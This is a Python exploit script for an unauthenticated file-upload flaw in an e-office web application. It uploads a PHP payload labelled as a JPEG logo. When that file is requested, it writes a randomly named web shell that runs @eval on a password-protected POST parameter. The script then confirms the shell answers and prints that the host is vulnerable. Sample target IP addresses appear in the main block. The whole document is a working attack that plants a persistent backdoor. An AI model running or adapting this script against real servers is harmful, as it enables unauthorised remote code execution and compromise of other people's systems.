import requests
import random
import string

import requests.models
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
}


def random_str():
    random_str = ''.join(random.sample(string.ascii_letters, 1) + random.sample(
        string.ascii_letters + string.digits, 4))
    return random_str


def check_shell(target, shell_name):
    url = target + "/images/logo/" + shell_name + ".php"
    try:
        response = requests.get(url, headers=headers, verify=False, timeout=30)
        if response.status_code == 200 and "Success" in response.text:
            return True
        else:
            print("[-] %s 利用失败" % target)
            return False
    except Exception as e:
        print("[-] %s 利用失败" % target)
        return False


def create_shell(target):
    url = target + "/images/logo/logo-eoffice.php"
    try:
        response = requests.get(url, headers=headers, verify=False, timeout=30)
        if response.status_code == 200:
            return True
        else:
            print("[-] %s Shell创建失败" % target)
    except Exception as e:
        print("[-] %s Shell创建失败" % target)
        return False


def upload_shell(target, file):
    url = target + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
    try:
        response = requests.post(url, headers=headers, files=file, timeout=30,
                                 verify=False)
        if response.status_code == 200 and "logo-eoffice.php" in response.text:
            return True
        else:
            print("[-] %s 上传失败" % target)
            return False
    except Exception as e:
        print("[-] %s 上传失败" % target)
        return False


def verify(target_urls):
    shell_name = random_str()
    shell_pass = random_str()
    # test_poc = "<?php phpinfo();?>"
    poc = "<?php $myfile = fopen(\"" + shell_name + ".php\", \"w\");$txt = 'Success<?php @eval($_POST[\"" + shell_pass + "\"]);?>';fwrite($myfile, $txt);fclose($myfile);?>"

    file = {
        "Filedata": ("test.php", poc, "image/jpeg",),
        "typeStr": "File"
    }

    for item in target_urls:
        item = item.replace("http://", "").replace("https://", "").strip()
        url = "http://" + item
        flag1 = upload_shell(url, file)
        if flag1:
            flag2 = create_shell(url)
            if flag2:
                flag3 = check_shell(url, shell_name)
                if flag3:
                    print("[+]" + url + "存在漏洞")


if __name__ == '__main__':
    data = [
        # "123.207.115.107:8082",
        # "183.230.141.35:8089"
        "1.1.1.1:8080"
    ]
    verify(data)
